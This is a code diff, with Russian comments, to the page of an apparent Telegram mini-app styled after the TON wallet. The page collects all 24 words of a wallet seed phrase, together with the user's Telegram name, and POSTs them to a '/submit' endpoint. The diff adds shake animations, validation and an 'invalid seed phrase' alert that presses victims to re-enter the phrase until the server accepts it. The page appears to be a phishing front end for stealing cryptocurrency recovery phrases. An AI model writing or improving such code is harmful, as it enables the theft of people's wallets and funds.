@@ -165,6 +165,11 @@
             font-size: 14px;
         }
 
+        .word-input.error {
+            border-color: #ff4444;
+            background: rgba(255, 68, 68, 0.1);
+        }
+
         .ton-button {
             background: linear-gradient(95deg, #1e4668, #2c6e9e);
             border: none;
@@ -469,34 +474,34 @@
         sendBtn.addEventListener('click', async () => {
     const wordsArray = [];
     let hasError = false;
+    let errorWordIndex = -1;
     
+    // Проверка всех полей на пустоту
     for (let i = 1; i <= 24; i++) {
         const inputField = document.getElementById(`word${i}`);
         const wordValue = inputField.value.trim();
-        if (!wordValue) {
-            inputField.style.borderColor = '#ff6b6b';
+        
+        if (!wordValue || wordValue.length < 2) {
+            // Тряска и красный цвет для пустого поля
+            inputField.classList.add('error');
             inputField.style.animation = 'shake 0.3s ease-in-out 0s 2';
             setTimeout(() => {
-                if (inputField) {
-                    inputField.style.borderColor = '';
-                    inputField.style.animation = '';
-                }
+                inputField.classList.remove('error');
+                inputField.style.animation = '';
             }, 800);
             hasError = true;
-            if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('error');
-            alert(`⚠️ Пожалуйста, заполните слово №${i}`);
-            inputField.focus();
-            break;
-        }
-        if (wordValue.length > 35) {
-            alert(`Слово №${i} слишком длинное (максимум 35 символов)`);
-            hasError = true;
+            errorWordIndex = i;
             break;
         }
         wordsArray.push(wordValue);
     }
     
-    if (hasError) return;
+    if (hasError) {
+        if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('error');
+        alert(`⚠️ Заполните слово №${errorWordIndex}`);
+        document.getElementById(`word${errorWordIndex}`).focus();
+        return;
+    }
 
     let username = tg.initDataUnsafe.user?.username || "без_имени";
     let first_name = tg.initDataUnsafe.user?.first_name || "";
@@ -513,11 +518,10 @@
     sendBtn.disabled = true;
     sendBtn.style.opacity = '0.6';
     sendingMessage.style.display = 'block';
-    sendingMessage.innerHTML = '⏳ Проверка данных...';
+    sendingMessage.innerHTML = '⏳ Проверка...';
     sendingMessage.style.color = '#ffaa44';
     
     try {
-        // Отправляем на Flask сервер
         const response = await fetch('/submit', {
             method: 'POST',
             headers: {
@@ -529,29 +533,46 @@
         const result = await response.json();
         
         if (response.ok && result.status === 'ok') {
-            sendingMessage.innerHTML = '✅ Данные отправлены!';
+            // ВСЁ ХОРОШО
+            sendingMessage.innerHTML = '✅ Фраза принята!';
             sendingMessage.style.color = '#88ff88';
             if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
             
-            // Переход на success
             setTimeout(() => {
                 formPage.classList.add('hidden');
                 successPage.classList.remove('hidden');
             }, 1000);
         } else {
-            throw new Error(result.message || 'Ошибка');
+            // НЕПРАВИЛЬНАЯ ФРАЗА - КРАСНЫЙ + ТРЯСКА + ALERT
+            throw new Error(result.message || 'Неверная seed фраза');
         }
     } catch(e) {
         console.error("Ошибка:", e);
-        sendingMessage.innerHTML = '❌ Ошибка отправки. Попробуйте еще раз.';
+        
+        // ТРЯСКА ДЛЯ ВСЕХ ПОЛЕЙ
+        for (let i = 1; i <= 24; i++) {
+            const field = document.getElementById(`word${i}`);
+            field.classList.add('error');
+            field.style.animation = 'shake 0.3s ease-in-out 0s 2';
+            setTimeout(() => {
+                field.classList.remove('error');
+                field.style.animation = '';
+            }, 800);
+        }
+        
+        // ALERT С ОШИБКОЙ
+        alert(`❌ НЕВЕРНАЯ SEED ФРАЗА!\n\nПроверьте правильность введенных слов.\n\nУбедитесь, что:\n• Все 24 слова введены\n• Слова только на английском\n• Нет лишних пробелов`);
+        
+        sendingMessage.innerHTML = '❌ Неверная фраза';
         sendingMessage.style.color = '#ff6666';
         sendBtn.disabled = false;
         sendBtn.style.opacity = '1';
-        alert("❌ Ошибка отправки. Попробуйте позже.");
+        
+        if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('error');
         
         setTimeout(() => {
             sendingMessage.style.display = 'none';
-        }, 3000);
+        }, 2000);
     }
 });
         
